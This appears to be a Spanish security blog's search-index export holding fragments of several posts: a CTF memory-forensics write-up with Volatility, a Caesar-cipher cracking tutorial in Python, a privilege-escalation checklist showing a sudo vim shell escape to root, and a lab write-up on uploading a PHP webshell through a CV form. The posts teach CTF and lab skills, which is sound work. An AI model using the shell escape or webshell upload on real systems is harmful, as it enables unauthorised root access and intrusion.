“on the fly” para aquellos que no se sintieran cómodos con el inglés o castellano a través de Discord, todo muy bien organizado. Este año se añadió al evento 2 CTFs, creado por la empresa Assap y otro por Women’s Society of Cyberjutsu organización que, al igual que la NOTPinkCon, busca acercar y acompañar a las mujeres interesadas en la ciberseguridad. De estos 2 CTFs hablaremos en esta publicación y en una segunda parte. ","date":"09-02-2020","objectID":"/volatility-ctf-notpinkcon/:0:0","tags":["forensics","ctf"],"title":"Volatility. Analizando la memoria RAM, NotPinkCon CTF. Parte 1)","uri":"/volatility-ctf-notpinkcon/"},{"categories":["forensics","ctf"],"content":"Volatility Volatility es un un framework escrito en python que nos permite agarrar una “imagen” que se haya tomado de la memoria RAM y hacer un análisis. Con esta imagen y su procesamiento mediante Volatility se puede obtener muchísima información de lo que estaba ocurriendo en el Sistema Operativo al momento en el que se tomó la imagen. Esto suele ser utilizado por personas que se dediquen al análisis forense, respuesta de incidentes, analistas de malware, etc. Personalmente no había utilizado la herramienta con anterioridad, lo bueno de participar en CTFs es que te “obliga” a utilizar herramientas o aprender nuevos conceptos para resolver los retos. Si bien había leído muchos artículos sobre análisis, con Volatility y la información que se podía obtener, al tener que realizarlo por mi cuenta quedé fascinado con lo que hice y sus posibilidades. ","date":"09-02-2020","objectID":"/volatility-ctf-notpinkcon/:1:0","tags":["forensics","ctf"],"title":"Volatility. Analizando la memoria RAM, NotPinkCon CTF. Parte 1)","uri":"/volatility-ctf-notpinkcon/"},{"categories":["forensics","ctf"],"content":"ASSAP CTF Luego de la introducción comencemos con lo divertido. El CTF creado por ASSAP consistía de 3 retos, empecemos por los que requerían un análisis de una imagen de la memoria RAM de un equipo infectado con un malware. ","date":"09-02-2020","objectID":"/volatility-ctf-notpinkcon/:2:0","tags":["forensics","ctf"],"title":"Volatility. Analizando la memoria RAM, NotPinkCon CTF. Parte 1)","uri":"/volatility-ctf-notpinkcon/"},{"categories":["forensics","ctf"],"content":"Primer reto La consigna era la siguiente: OH MY GODCTF0 \"\rOH MY GOD\r Nos dan una imagen de la memoria RAM para descargar y procedemos a analizarla para obtener la ip del host sospechoso al cual se estaban realizando las conexiones por el puerto 80. Una vez descargada la imagen, pocredemos a analizarla con Volatility en nuestro Kali Linux (ya se encuntra instalado por defecto). Antes de comenzar a obtener lo que se nos solicitó, necesitamos saber qué tipo de sistema operativo estaba corriendo en el equipo. Para eso ejecutamos el comando “volatility -f memory.vmem imageinfo” con el parámetro -f le indicamos qué archivo va a analizar y con imageinfo le indicamos qué información queremos obtener sobre la imagen, el resultado de la ejecución es el siguiente: $volatility -f memory.vmem imageinfo Volatility Foundation Volatility Framework 2.6 INFO : volatility.debug : Determining profile based on KDBG search... Suggested Profile(s) : WinXPSP2x86, WinXPSP3x86 (Instantiated with WinXPSP2x86) AS Layer1 : IA32PagedMemoryPae (Kernel AS) AS Layer2 : FileAddressSpace (/home/mramirez/Desktop/NOTPINK-CTF/assap/sigcheck/memory.vmem) PAE type : PAE DTB : 0x319000L KDBG : 0x80544ce0L Number of Processors : 1 Image Type (Service Pack) : 2 KPCR for CPU 0 : 0xffdff000L KUSER_SHARED_DATA : 0xffdf0000L Image date and time : 2010-08-15 19:17:56 UTC+0000 Image local date and time : 2010-08-15 15:17:56 -0400 Volatility esta basado en años de investigaciones académicas sobre el análisis avanzado de la memoria RAM, al ser un proyecto Open Source y modular, tiene muchísimas funcionalidades y es capaz de analizar cada aspecto de las aplicaciones y sistema operativo que corría al momento de tomar la imagen. En este caso se nos indica que se sugiere utilizar el “profile” “WinXPSP2x86” o “WinXPSP3x86”, cada sistema operativo utiliza y guarda en la memoria RAM los datos de distinta manera, incluso entre versiones del mismo sistema operativo hay diferencias en cómo son almacenados los datos y qué tipo de dato es. En este caso nos sugiere que se analice utilizando el perfil para “Windows XP SP2” en su version de 32 bits. Conociendo esto ya podemos proceder a obtener la información que se nos pide en el reto. Lo que debíamos obtener es a qué dirección ip se estban realizando conexiones sospechosas sobre el puerto 80, esto lo podemos lograr ejecutando el siguiente comando, “volatility -f memory.vmem –profile=WinXPSP2x86 connscan”, en este caso agregamos los parámetros –profile en que especificamos con qué “perfil” se debería analizar la imagen y connscan para que nos muestre las conexiones. $ volatility -f memory.vmem --profile=WinXPSP2x86 connscan Volatility Foundation Volatility Framework 2.6 Offset(P) Local Address Remote Address Pid ---------- ------------------------- ------------------------- --- 0x02214988 172.16.176.143:1054 193.104.41.75:80 856 0x06015ab0 0.0.0.0:1056 193.104.41.75:80 856 El resultado, por lo que pueden ver, es muy completo. Tenemos direccion local desde la cual se está realizando la conexión, la dirección remota y el identifcador del proceso(PID) que está realizando dicha conexion, en este caso solo se nos pide la ip. así que el flag para resolver el reto es “193.104.41.75”. ","date":"09-02-2020","objectID":"/volatility-ctf-notpinkcon/:2:1","tags":["forensics","ctf"],"title":"Volatility. Analizando la memoria RAM, NotPinkCon CTF. Parte 1)","uri":"/volatility-ctf-notpinkcon/"},{"categories":["forensics","ctf"],"content":"Segundo reto Otro de los retos era obtener el PID del proceso que realiza la conexión. Esto lo obtuvimos con el comando anterior, se puede observar que el PID es el 856. PIDCTF1 \"\rPID\r A modo de demostración podemos obtener también el nombre del proceso que estaba realizando las conexiones con el siguiente comando: “volatility -f memory.vmem –profile=WinXPSP2x86 pslist”. En este caso agregamos el parametro pslist que nos va a mostrar la lista de todos los procesos en ejecución. $ volatility -f memory.vmem --profile=WinXPSP2x86 pslist Volatility Foundation Volatility Framework 2.6 Offset(V) Name PID PPID Thds Hnds Sess Wow64 Start Exit ---------- -------------------- ------ ------ ------ -------- ------ ------ ------------------------------ ------------------------------ 0x810b1660 System 4 0 58 379 ------ 0 0xff2ab020 smss.exe 544 4 3 21 ------ 0 2010-08-11 06:06:21 UTC+0000 0xff1ecda0 csrss.exe 608 544 10 410 0 0 2010-08-11 06:06:23 UTC+0000 0xff1ec978 winlogon.exe 632 544 24 536 0 0 2010-08-11 06:06:23 UTC+0000 0xff247020 services.exe 676 632 16 288 0 0 2010-08-11 06:06:24 UTC+0000 0xff255020 lsass.exe 688 632 21 405 0 0 2010-08-11 06:06:24 UTC+0000 0xff218230 vmacthlp.exe 844 676 1 37 0 0 2010-08-11 06:06:24 UTC+0000 0x80ff88d8 svchost.exe 856 676 29 336 0 0 2010-08-11 06:06:24 UTC+0000 0xff217560 svchost.exe 936 676 11 288 0 0 2010-08-11 06:06:24 UTC+0000 0x80fbf910 svchost.exe 1028 676 88 1424 0 0 2010-08-11 06:06:24 UTC+0000 0xff22d558 svchost.exe 1088 676 7 93 0 0 2010-08-11 06:06:25 UTC+0000 0xff203b80 svchost.exe 1148 676 15 217 0 0 2010-08-11 06:06:26 UTC+0000 0xff1d7da0 spoolsv.exe 1432 676 14 145 0 0 2010-08-11 06:06:26 UTC+0000 0xff1b8b28 vmtoolsd.exe 1668 676 5 225 0 0 2010-08-11 06:06:35 UTC+0000 0xff1fdc88 VMUpgradeHelper 1788 676 5 112 0 0 2010-08-11 06:06:38 UTC+0000 0xff143b28 TPAutoConnSvc.e 1968 676 5 106 0 0 2010-08-11 06:06:39 UTC+0000 0xff25a7e0 alg.exe 216 676 8 120 0 0 2010-08-11 06:06:39 UTC+0000 0xff364310 wscntfy.exe 888 1028 1 40 0 0 2010-08-11 06:06:49 UTC+0000 0xff38b5f8 TPAutoConnect.e 1084 1968 1 68 0 0 2010-08-11 06:06:52 UTC+0000 0x80f60da0 wuauclt.exe 1732 1028 7 189 0 0 2010-08-11 06:07:44 UTC+0000 0xff3865d0 explorer.exe 1724 1708 13 326 0 0 2010-08-11 06:09:29 UTC+0000 0xff3667e8 VMwareTray.exe 432 1724 1 60 0 0 2010-08-11 06:09:31 UTC+0000 0xff374980 VMwareUser.exe 452 1724 8 207 0 0 2010-08-11 06:09:32 UTC+0000 0x80f94588 wuauclt.exe 468 1028 4 142 0 0 2010-08-11 06:09:37 UTC+0000 0xff224020 cmd.exe 124 1668 0 -------- 0 0 2010-08-15 19:17:55 UTC+0000 2010-08-15 19:17:56 UTC+000 Si buscamos en la columna PID el número “856” y luego observamos en la misma línea la columna “Name” encontramos que el nombre del proceso que está realizando las conexiones es “svchost.exe”. ","date":"09-02-2020","objectID":"/volatility-ctf-notpinkcon/:2:2","tags":["forensics","ctf"],"title":"Volatility. Analizando la memoria RAM, NotPinkCon CTF. Parte 1)","uri":"/volatility-ctf-notpinkcon/"},{"categories":["forensics","ctf"],"content":"Tercer reto Por último, el 3er reto. En este se nos habla de SIGCHECK, una de las tantas maravillosas herramientas de sysinternals(Process Explorer, procdump, psexec, etc), con esta herramienta podemos analizar archivos ejecutables y obtener su versión, timestamp, firma digital, hash, etc. Pero una de sus mejores características es comprobar el archivo en VirusTotal y saber si el archivo se trata de un malware. El reto era el siguiente: SIGCHECKCTF3 \"\rSIGCHECK\r Nos dan un enlace para descargar un archivo con la extensión .numbers. Luego de una simple búsqueda en Google, me percato de que el archivo pertenece al programa “Numbers” de la suite “iWork”, sería el equivalente de Excel en Microsoft Office. Buscamos un conversor para transformarlo a un formato que podamos leer. Encontré la página https://cloudconvert.com/numbers-to-csv/ la cual nos permite, como lo dijimos antes, convertir el archivo a CSV. Numbers ConverterNumbers \"\rNumbers Converter\r Una vez convertido podemos ver su contenido con nano(?). CSV nanonano \"\rCSV nano\r Bueno, no se ve muy bonito y no es muy fácil de leer, pero en base a la consigna que tenemos en el reto, lo que necesitamos saber es el nombre del archivo que disparó las alertas. Sabiendo eso, podemos procesar el archivo con las grandiosas herramientas que los Dioses de UNIX nos dieron cuando el mundo fue creado. Ken Thompson y Dennis RitchieUnixGods \"\rKen Thompson y Dennis Ritchie\r Sí, estamos hablando de procesar el archivo con los míticos comandos cat, awk y grep. Sabemos que el archivo es un CSV separado por comas. Y lo que estamos buscando son los archivos que hicieron saltar las “alarmas”, el archivo CSV que obtuvimos luego de la conversión se trata de la salida del comando SIGCHECK con los resultados luego de analizar la carpeta “z:\\windows_mount\\windows\\system32” y todos sus archivos. El archivo CSV consta de varias columnas. Path,Verified,Date,Publisher,Company,Description,Product,Product Version,File Version,Machine Type,MD5,SHA1,PESHA1,PESHA256,SHA256,IMP,VT detection,VT link Las que nos interesan son “Path” para saber el nombre del archivo sospechoso y “VT Detection” para saber si el archivo tiene detección como malware, por los antivirus que analizan el archivo en VirusTotal. En la columna “VT Detection”, nos aparece la cantididad de detecciones y la cantidad de soluciones antivirus que analizaron el archivo separado por el caracter “|”. Con el comando grep podemos filtrar solo los archivos cuyas líneas no contengan “0|” y luego con awk imprimir solo las columnas que nos interesan. cat sigcheck-win7-32-blabla01.csv | grep -v \"0|\" |awk 'BEGIN {FS = \",\"}; {print $1 \",\" $17 }' Path,VT detection z:\\windows_mount\\windows\\system32\\TPVMW32.dll,1|60 z:\\windows_mount\\windows\\system32\\pe.exe,1|60 z:\\windows_mount\\windows\\system32\\f-response-ent.exe,3|62 z:\\windows_mount\\windows\\system32\\TPVMMon.dll,1|62 z:\\windows_mount\\windows\\system32\\hydrakatz.exe,42|61 z:\\windows_mount\\windows\\system32\\sekurlsa.dll,33|56 Maravilloso, de las 2081 líneas del archivo original solo nos quedaron 6 líneas, observamos que el archivo con más detecciones es “hydrakatz.exe”, con 42 detecciones. El flag para el reto es “hydrakatz.exe”, sí, ya se lo que están pensando, de seguro era más fácil llevar el CSV a Excel o Calc y filtrar los resultados. ¿Pero esto no se trata de aprender cosas nuevas? ","date":"09-02-2020","objectID":"/volatility-ctf-notpinkcon/:2:3","tags":["forensics","ctf"],"title":"Volatility. Analizando la memoria RAM, NotPinkCon CTF. Parte 1)","uri":"/volatility-ctf-notpinkcon/"},{"categories":["forensics","ctf"],"content":"Bonus track Cuando uno lee las soluciones de los CTFs se suele pensar que la persona que lo escribió es un “genio” o “genia”, que tiene las respuestas a todas las preguntas. La verdad es que no es así, como comenté en un principio no había utilizado nunca Volatility, y no conocía con anterioridad SIGCHECK y me llevé un gran aprendizaje haciendo este CTF. La manera de resolver los retos es perserverar e intentar distintas soluciones a los problemas. Mientras realizaba el primer reto que expuse no me tomaba el “flag” “193.104.41.75”, por lo que procedí a tomar otros caminos pensando que me estaba equivocando en la respuesta. Eso me llevó a un cheatsheet sobre Volatility y en especial a una manera de extraer los archivos que se podían encontrar en la memoria RAM. Volatility is AWSOME!CheatSheat \"\rVolatility is AWSOME!\r Lo que decidí hacer era ver si podía dumpear todos los archivos ejecutables que se pudieran encontrar, utilizar SIGCHECK para comprobar los archivos contra VirusTotal, saber cuál era el malware que estaba realizando las conexiones y encontrar cuál era la IP a la que se conectaba. Para “dumpear” todos los ejecutables utilicé el siguiente comando: volatility -f memory.vmem --profile=WinXPSP2x86 dumpfiles -n -i -r \\\\.exe --dump-dir=./dump3 Volatility Foundation Volatility Framework 2.6 ImageSectionObject 0x80ff85c0 544 \\Device\\HarddiskVolume1\\WINDOWS\\system32\\smss.exe ImageSectionObject 0x80f2e828 608 \\Device\\HarddiskVolume1\\WINDOWS\\system32\\csrss.exe DataSectionObject 0xff12bb40 632 \\Device\\HarddiskVolume1\\WINDOWS\\system32\\sdra64.exe ImageSectionObject 0x80f6e800 632 \\Device\\HarddiskVolume1\\WINDOWS\\system32\\winlogon.exe DataSectionObject 0x80f6e800 632 \\Device\\HarddiskVolume1\\WINDOWS\\system32\\winlogon.exe ImageSectionObject 0xff39f140 676 \\Device\\HarddiskVolume1\\WINDOWS\\system32\\services.exe ImageSectionObject 0x80f05028 688 \\Device\\HarddiskVolume1\\WINDOWS\\system32\\lsass.exe ImageSectionObject 0xff386440 844 \\Device\\HarddiskVolume1\\Program Files\\VMware\\VMware Tools\\vmacthlp.exe ImageSectionObject 0xff379f90 856 \\Device\\HarddiskVolume1\\WINDOWS\\system32\\svchost.exe ImageSectionObject 0x81000f28 1432 \\Device\\HarddiskVolume1\\WINDOWS\\system32\\spoolsv.exe ImageSectionObject 0xff3b9c68 1668 \\Device\\HarddiskVolume1\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe ImageSectionObject 0xff3c04e8 1788 \\Device\\HarddiskVolume1\\Program Files\\VMware\\VMware Tools\\VMUpgradeHelper.exe ImageSectionObject 0x80f00af8 1968 \\Device\\HarddiskVolume1\\Program Files\\VMware\\VMware Tools\\TPAutoConnSvc.exe ImageSectionObject 0x80f75b68 216 \\Device\\HarddiskVolume1\\WINDOWS\\system32\\alg.exe ImageSectionObject 0x80f31ba0 888 \\Device\\HarddiskVolume1\\WINDOWS\\system32\\wscntfy.exe ImageSectionObject 0xff379028 1084 \\Device\\HarddiskVolume1\\Program Files\\VMware\\VMware Tools\\TPAutoConnect.exe ImageSectionObject 0xff1e1480 1732 \\Device\\HarddiskVolume1\\WINDOWS\\system32\\wuauclt.exe DataSectionObject 0xff1e1480 1732 \\Device\\HarddiskVolume1\\WINDOWS\\system32\\wuauclt.exe ImageSectionObject 0x80fff578 1724 \\Device\\HarddiskVolume1\\WINDOWS\\explorer.exe DataSectionObject 0x80fff578 1724 \\Device\\HarddiskVolume1\\WINDOWS\\explorer.exe ImageSectionObject 0x80fb5e58 432 \\Device\\HarddiskVolume1\\Program Files\\VMware\\VMware Tools\\VMwareTray.exe DataSectionObject 0x80fb5e58 432 \\Device\\HarddiskVolume1\\Program Files\\VMware\\VMware Tools\\VMwareTray.exe ImageSectionObject 0x80fb5138 452 \\Device\\HarddiskVolume1\\Program Files\\VMware\\VMware Tools\\VMwareUser.exe DataSectionObject 0x80fb5138 452 \\Device\\HarddiskVolume1\\Program Files\\VMware\\VMware Tools\\VMwareUser.exe El comando nos dejó todos los archivos encontrados en la carpeta “dump3”, en el nombre podemos observar el identificador de proceso al que está asociado el archivo y el nombre del archivo. Files DumpFilesDump \"\rFiles Dump\r Como me gusta mantenerme en Linux, ejecutamos Sigcheck con wine (ejecutar la version de 64 bits de wine junto con la version 64bits de sigcheck) para realizar el escaneo de los archivos que obtuvimos. Luego d","date":"09-02-2020","objectID":"/volatility-ctf-notpinkcon/:2:4","tags":["forensics","ctf"],"title":"Volatility. Analizando la memoria RAM, NotPinkCon CTF. Parte 1)","uri":"/volatility-ctf-notpinkcon/"},{"categories":["cracking"],"content":"Breve introducción al cracking - parte I No hay secreto que el tiempo no revele. - Jean-Baptiste Racine Habitualmente se cree que cuando hablamos de cracking, hablamos de una práctica que vulnera la privacidad ajena de las personas o de las empresas. Pero esto no siempre es así. Crackear no es una práctica ilegal per se, sino la puesta en práctica del conocimiento sobre las ciencias de la criptografía. Y digo ciencias, porque cuando hablamos de cifrar y descifrar información, no solo estamos hablando de computadoras, sino también de un amplio espectro de disciplinas que van desde la lingüística, la psicología, las matemáticas y, por supuesto, la informática. En resumen, crackear es una práctica, relacionada al estado del arte de una o varias ciencias, con el objetivo de obtener algún beneficio o alguna información, la cual en principio nos era negada. Imagen 1. Máquina de cifrado francesa del siglo XVI en forma de libro de Enrique II.French_cypher_machine \"\rImagen 1. Máquina de cifrado francesa del siglo XVI en forma de libro de Enrique II.\r Hoy en día, el cracking resulta un pilar importante en investigaciones. Por ejemplo, para hallar solución a los ransomwares, para atrapar redes criminales, para análisis forenses, en tácticas militares y, por supuesto, por hackers. Básicamente, siempre que alguien oculte información y alguien intente descifrarla estarán las condiciones para que podamos hablar de cracking. En cada caso, cada bando pondrá en marcha una serie de ingeniosos artilugios para lograr el objetivo deseado: ocultar u obtener información. ","date":"08-10-2020","objectID":"/cracking-time-001/:0:0","tags":["cracking","encriptación","cesar"],"title":"Breve introducción al cracking - parte I","uri":"/cracking-time-001/"},{"categories":["cracking"],"content":"1. ¿Pero qué significa “cifrar”? Cifrar refiere al proceso de alteración de la información cuyo resultado oculte las características de la materia en su estado inicial, con el fin de aumentar su seguridad. ¿De cuáles características hablamos? Podemos mencionar algunas, como lo son características semánticas, sintácticas, lógicas, etc. Pero en realidad, la noción de característica que podemos alterar solo se limita a nuestra imaginación. Las características de la información que alteremos pueden ser tantas como las que se desean ocultar. Podría cifrarse un mensaje escrito y desarmar su estructura semántica o sintáctica, y sin embargo mantener los símbolos alfanuméricos, con lo cual el resultado ahora es ilegible, pero mantiene aún cierta relación con el mensaje original. Podría transformarse, por ejemplo, en una lista de caracteres ASCII, o en un mismo carácter repetido eternamente, lo que no necesariamente signifique que sea más seguro (pero no podemos negar que dichos casos nos parecen mas ingeniosos). Ahora, cada vez que alteramos la información, ¿estamos cifrándola? ciertamente no, y la razón principal es que para que podamos hablar propiamente de un cifrado, se debe tener como punto de partida el objetivo original: que no pueda ser comprendido por personas ajenas al grupo al que pertenece dicha información. Por ejemplo, el código morse no pretende ocultar la información, solo la codifica de tal forma que -efectivamente- se han alterado las características del mensaje, pero a través de un método conocido y público, al que cualquier persona podrá utilizar para obtener nuevamente el mensaje original. Si traducimos una palabra del español al sistema de kanji japonés, ciertamente será complicado de entender para alguien que no sepa leer kanjis, pero el mensaje, como tal, y el sistema para recuperarlo, no es ningún secreto. Cualquiera podrá acceder al mensaje si así lo desea. Para quienes tengan conocimientos en disciplinas humanísticas o sociales, pensarán en el polimorfismo de las diferentes lenguas, o de los códigos sociales y tribales. Estos, por más complejo que sea comprenderlos, pertenecen al universo de los códigos y no de los cifrados. Imagen 2. Telégrafo del siglo XIXmorse \"\rImagen 2. Telégrafo del siglo XIX\r Código y cifrado son fenomenológicamente parecidos, pero la principal diferencia está en que el código pretende ser interpretado y/o utilizado públicamente, no oculta nada, mientras que el cifrado tiene como único objetivo que la información permanezca oculta. El cifrado no pretende comunicar “per se”: aunque el mensaje que haya sido cifrado puede tener un emisor y un destinatario, el cifrado no facilita la comunicación. De hecho es todo lo contrario, pretende transformar la información en algo secreto y/o incomprensible. ¿Y que tiene que ver todo esto con cracking? Mucho, porque si cae en nuestras manos un mensaje, una cadena de texto extraña, un disco cifrado, un programa, o una grabación que sospechamos ha sido alterada, la primero que debemos preguntarnos es sobre su contexto. ¿Quién pudo haber enviado esto? ¿Cómo pudo haberse alterado la información inicial? ¿Estará codificado o estará cifrado? Y si está cifrado, seguramente nos preguntemos si podemos identificar el sistema de encriptación, o ha sido alterado por un método creado particularmente para esa ocasión (esto no es raro, en algunos malwares encontramos este tipo de prácticas). También nos preguntaremos por la clave, si es que tiene una clave, y si es posible recuperarla o encontrarla por algún método, o si podemos saltearlos los métodos de autentificación de un programa, o alterarlos para nuestro beneficio, etc. Pero eso ya es motivo de otro capítulo. Lo importante, que quiero dejar en claro, es que antes de ponernos a crackear cosas, lo mejor es intentar conocerlas y aprender de ellas. Es el camino más tedioso, pero a la larga el que más frutos y secretos nos revelará. Hasta acá la introducción teórica. El título de la entrada dice cracking y aca en","date":"08-10-2020","objectID":"/cracking-time-001/:1:0","tags":["cracking","encriptación","cesar"],"title":"Breve introducción al cracking - parte I","uri":"/cracking-time-001/"},{"categories":["cracking"],"content":"2. El cifrado por desplazamiento o “el cifrado César” Aunque el uso de este tipo de cifrado puede hallarse en varias culturas, en la bibliografías es frecuente que se lo adjudiquen a Julio César, sobre todo por haber sido mencionado en varios textos de sus contemporáneos. ¿En qué consiste el cifrado por desplazamiento? El cifrado por desplazamiento es un tipo de cifrado por sustitución. Como su nombre lo indica, se sustituye cada carácter inicial por otro a partir de n desplazamientos en el alfabeto. Así, si tomamos la clave n = 3, el resultado es que A pasa a ser D, D pasa a ser G, y así sucesivamente. Imagen 3. Mapa de cifrado por desplazamientoCésar-crypt \"\rImagen 3. Mapa de cifrado por desplazamiento\r Veamos ahora una forma de representarlo en algún código. En principio, necesitamos una lista alfabética, para ello vamos a valernos de la librería string: #!/usr/bin/env python3 # -*- coding: utf-8 -*- import string list_alpha = list(string.ascii_lowercase) list_alpha len(list_alpha) output: [‘a’, ‘b’, ‘c’, ’d’, ‘e’, ‘f’, ‘g’, ‘h’, ‘i’, ‘j’, ‘k’, ‘l’, ’m’, ‘n’, ‘o’, ‘p’, ‘q’, ‘r’, ’s’, ’t’, ‘u’, ‘v’, ‘w’, ‘x’, ‘y’, ‘z’] 26 Con el comando list() ya obtenemos la lista de caracteres indexados y también sabemos, a través del método len(), que tiene un total de 26 valores. Por lo que basta con agregarle un valor N al valor index de cada elemento y así obtendremos su valor cifrado. def CesarCipher(message, key): code = \"\" for letter in message: code += list_alpha[list_alpha.index(letter)+key] return code CesarCipher(\"bhf\", 2) output: djh Pues bien, el problema aquí es que si el valor de cada elemento + n es mayor a 25, se saldrá de la lista. Para simular la “vuelta al inicio” podemos restarle 26 (recuerden contar desde 0) a cualquier situación donde el valor obtenido sea \u003e= 26: def CesarCipher(message, key): code = \"\" for letter in message: number = int() number = list_alpha.index(letter)+key while number \u003e= 26: number = number - 26 code += list_alpha[number] return code CesarCipher(\"bhf\", 20) output: vbz Un último detalle: list_alpha no incluye los signos de puntuación, por lo que será prudente pasarlos por alto. El resultado final sería este: #!/usr/bin/env python3 # -*- coding: utf-8 -*- import string list_alpha = list(string.ascii_lowercase) def CesarCipher(message, key): code = \"\" for letter in message: if letter in list_alpha: number = list_alpha.index(letter)+key while number \u003e= 26: number -= 26 code += list_alpha[number] else: code += letter return code CesarCipher(\"ahora podemos usar el código de bhf para mandar mensajes cifrados.\", 2) output: cjqtc rqfgoqu wuct gn eqfkiq fg djh rctc ocpfct ogpuclgu ekhtcfqu. nota: Quizás quieran agregarle otro condicional if para las mayúsculas, simplemente transformar el mensaje a lowercase. Muy bien, ya tenemos nuestro mensaje. ¿Ahora, cómo podemos crackearlo? Supongo que recuerdan que en la introducción hablaba de que antes de ponernos a crackear conviene hacerse algunas preguntas. Si nosotros sabemos que el mensaje se cifró por desplazamiento, pues podemos continuar desplazándose con el mismo código para obtener como resultado la posición inicial. Si se utilizó key = 2, entonces 26 - 2 = 24. Veámoslo en marcha: CesarCipher(\"gp gn ekhtcfq eguct, cn eqorngvct gn dweng fg fgurncbcokgpvq, qdvgpgoqu gn ogpuclg qtkikpcn.\", 24) output: en el cifrado cesar, al completar el bucle de desplazamiento, obtenemos el mensaje original. Supongamos que no sabemos que la key es igual a 2. Podemos simplemente pasarlo por un bucle for de 26 intentos, para ver si alguno nos resultará familiar: message = \"kt kyzk igyu kr sktygpk ky jkiahokxzu vux hayigx rg igjktg hnl kt zujuy ruy xkyarzgjuy uhzktojuy.\" for n in range(26): CesarCipher(message, n) Podrán imaginarse que el output no es otra cosa que 26 líneas, y una sola es la correcta. Este tipo de ataque entra en la categoría llamada “fuerza bruta” (pero no crean que fuerza bruta es solo esto). En este caso el exceso de falsos positivos no es grave, pero si ","date":"08-10-2020","objectID":"/cracking-time-001/:2:0","tags":["cracking","encriptación","cesar"],"title":"Breve introducción al cracking - parte I","uri":"/cracking-time-001/"},{"categories":[],"content":"Checklist de posibilidades para escalar privilegios desde www-data “Entramos, ¿y ahora qué hacemos?” Pregunta que me hice muchas veces cuando empecé a participar en distintos CTF (Capture The Flag). Leí libros, sites, foros, hilos, videos (¡sí!, leo videos) y quedaba fascinado, pero la teoría puede ser muy bonita (o súper boring) si no se lleva a la práctica. Por eso empecé a participar de CTF y a principios de este año logré registrarme en HTB. Al lograr acceso a alguna máquina intentaba hacer algo, como leer archivos sensible y ejecutar determinados comandos; no lograba mucho ya que el usuario que utilizaba tenía muy bajos privilegios. Esto sucede en muchos CTF, ingresás al servidor web como el usuario público www-data, lográs ejecutar comandos pero es muy poco lo que se puede hacer. Al principio iba y venía entre directorios. Listaba para ver qué carpetas y archivos que podía leer o modificar. Existen varias cuestiones que podemos probar, presento las más utilizadas y, en general, las que dan resultado en los CTF. Se trata de cinco pruebas en la lista: Si soy sudoers Binarios SUID Archivos w \u0026 x Procesos de servicios Kernel vulnerable Puedo ejecutar comandos, ahora pruebo: ","date":"08-09-2020","objectID":"/privilegios/:0:0","tags":["privilegios, escalar, root, sudo"],"title":"Checklist para escalar privilegios desde www-data","uri":"/privilegios/"},{"categories":[],"content":"1° - Si soy sudoers (estás en la lista en /etc/sudoers) En uno de esos retos aprendí que si conocemos los comandos que podemos ejecutar como root, podemos abusar de ellos (Shebi’s credit). Entonces, listamos aquellos comandos con privilegios de root que tenemos permitido ejecutar sin contraseña. En otras palabras, qué comandos puede ejecutar como súper usuario el usuario www-data, o cualquier otro con el que ingresemos. Para esto, ejecutamos el comando sudo -l Si existen comandos que podemos ejecutar como root sin uso de password, podemos abusar de estos. Imaginémos el siguente escenario: sudo -l bronxi@flux:~$ sudo -l Coincidiendo entradas por defecto para bronxi en flux: env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin El usuario bronxi puede ejecutar los siguientes comandos en flux: (root) NOPASSWD: /usr/bin/find (root) NOPASSWD: /usr/bin/vim Existen dos comandos que podemos ejecutar como root sin la necesidad de la clave: find y vim. ¿Cómo abusamos de ellos? Encontramos información detallada de cualquiera de estos dos comandos y muchísimos más en https://gtfobins.github.io A modo de ejemplo, seleccionemos “vim”, ejecutamos vim -c ‘:!/bin/sh’ ‘# whoami root ‘# Y ya podemos ejecutar como root. Fácil, ¿cierto? En breve, publicaré cómo sigue nuestra lista mágica. *Para realizar este lista, tomé como base esta publicación y profundicé cada uno de los puntos: https://failingsilently.wordpress.com/2017/08/07/privesc/ ","date":"08-09-2020","objectID":"/privilegios/:1:0","tags":["privilegios, escalar, root, sudo"],"title":"Checklist para escalar privilegios desde www-data","uri":"/privilegios/"},{"categories":[],"content":"Ficha técnica Nombre: Deerhost Creadores: Matías Ramirez \u0026 MemoryEmpty Nivel: Muy fácil ","date":"08-02-2020","objectID":"/deerhost/:0:0","tags":["write-up"],"title":"[Write-up] Deerhost","uri":"/deerhost/"},{"categories":[],"content":"Introducción a Deerhost Deerhost es una sandbox que desarrollamos para que los asistentes al encuentro de GDG Training puedan poner en práctica las técnicas de RCE expuestas en el encuentro “RCE hasta la cocina en GDG”. Este paso a paso tiene como fín servir de material de consulta para repasar lo aprendido. Les recomiendo tener a mano las diapositivas de la exposición desarrolladas por Matías, que es un material de consulta muy claro en el impacto que estas vulnerabilidades pueden llegar a alcanzar en entornos reales. ","date":"08-02-2020","objectID":"/deerhost/:1:0","tags":["write-up"],"title":"[Write-up] Deerhost","uri":"/deerhost/"},{"categories":[],"content":"Enumeración Nuestra primera tarea a la hora de auditar -o de hackear- siempre es reconocer los posibles vectores de ataque. En este caso, con solamente navegar por el sitio podrán encontrar dos vulnerabilidades sencillas de explotación. ","date":"08-02-2020","objectID":"/deerhost/:2:0","tags":["write-up"],"title":"[Write-up] Deerhost","uri":"/deerhost/"},{"categories":[],"content":"1. Tomando el control con nuestros CV’s Apenas abrimos deerhost veremos un par de links en el encabezado. Si nos dirigimos a la página de “work with us” (/cv.php) nos encontramos con un formulario para subir nuestro CV a la empresa. Naturalmente, nos preguntamos, ¿Qué clase de cuidado han tenido los desarrolladores del sitio para prevenir que en lugar de un CV, alguien suba algún maliciosos? Para averiguarlo, podemos preparar una simple prueba: \u003c?php phpinfo(); ?\u003e nota: phpinfo() es una función de php para consultar la version y otros datos del servicio instalado. Cuando al subir un archivo con esta función obtenemos el la ejecución del mismo, es probable que podamos ejecutar otros comando. Al subirla vemos que la respuesta del sitio delata que el archivo ha sido guardado. Si logramos dar con su paradero, en /uploads/\u003cnombre_del_archivo.php\u003e podemos ver que nuestro prueba funciona perfectamente. Ahora podemos mejorar nuestro payload: En lugar de ejecutar dicho comando, podemos ejecutar una webshell corra en php. Pueden hacer la prueba con cualquiera de esta lista. ","date":"08-02-2020","objectID":"/deerhost/:3:0","tags":["write-up"],"title":"[Write-up] Deerhost","uri":"/deerhost/"},{"categories":[],"content":"2. Busqueda de dominios, un tanto especial En la pagina principal podemos consultar por un dominio y ver si esta disponible para contratarlo. No hay nada raro en ello, sin embargo, al hacer una simple consulta - como puede ser ingresando google.com - el output del sitio nos resulta algo peculiar. ¿Qué es nslookup? Es un comando 